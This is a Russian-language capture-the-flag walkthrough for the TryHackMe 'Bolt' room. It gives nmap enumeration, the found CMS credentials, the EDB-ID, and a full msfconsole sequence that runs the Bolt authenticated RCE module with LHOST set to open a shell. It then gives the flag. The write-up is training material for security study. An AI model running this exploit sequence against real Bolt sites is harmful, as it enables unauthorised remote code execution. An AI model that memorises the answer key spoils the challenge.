[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Bolt](https://tryhackme.com/r/room/bolt) 

Всего 2 задания:
## Задание 1
Эта комната предназначена для пользователей, чтобы ознакомиться с Bolt CMS и тем, как ее можно эксплуатировать с 
помощью Authenticated Remote Code Execution. Вам следует подождать не менее 3-4 минут, чтобы машина запустилась 
должным образом.

Если у вас есть какие-либо вопросы или отзывы, вы можете связаться со мной через сервер TryHackMe Discord или через 
Twitter. 

### Ответьте на вопросы ниже
Запустите машину

```commandline
Ответ не нужен
```
## Задание 2
#### Герой освобожден

После успешного развертывания виртуальной машины проведите ее перебор, прежде чем искать флаг на машине.

### Ответьте на вопросы ниже
Какой номер порта имеет веб-сервер с работающей CMS?
```commandline
nmap <IP>
```
```commandline
8000
```
Какое имя пользователя мы можем найти в CMS?
```commandline
http://<IP>:8000
```
```commandline
bolt
```
Какой пароль мы можем найти для этого имени пользователя?
```commandline
boltadmin123
```
Какая версия CMS установлена на сервере? (Пример: Название 1.1.1)
```commandline
http://<IP>:8000/bolt/login
# bolt:boltadmin123
```
```commandline
Bolt 3.7.1
```
Есть эксплойт для предыдущей версии этой CMS, который позволяет аутентифицированный RCE.  Найдите его на Exploit DB. Какой у него EDB-ID?
```commandline
48296
```
Metasploit недавно добавил модуль эксплойта для этой уязвимости. Каков полный путь для этого эксплойта? (Например: explore/....)

Примечание: Если вы не можете найти модуль эксплойта, скорее всего, ваш metasploit не обновлен. Запустите ` apt 
update `, затем ` apt install metasploit-framework ` 

```commandline
apt update
apt install metasploit-framework
msfconsole
search bolt
use exploit/unix/webapp/bolt_authenticated_rce
set RHOSTS <IP>
set LHOST <IP>
set USERNAME bolt
set PASSWORD boltadmin123
set TARGETURI http://<IP>:8000/
exploit
```
```commandline
exploit/unix/webapp/bolt_authenticated_rce
```
Установите LHOST, LPORT, RHOST, USERNAME, PASSWORD  в msfconsole перед запуском эксплойта
```commandline
Ответ не нужен
```
Найдите flag.txt внутри машины.
```commandline
whoami
cd /home
ls -al
cat flag.txt
```
```commandline
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)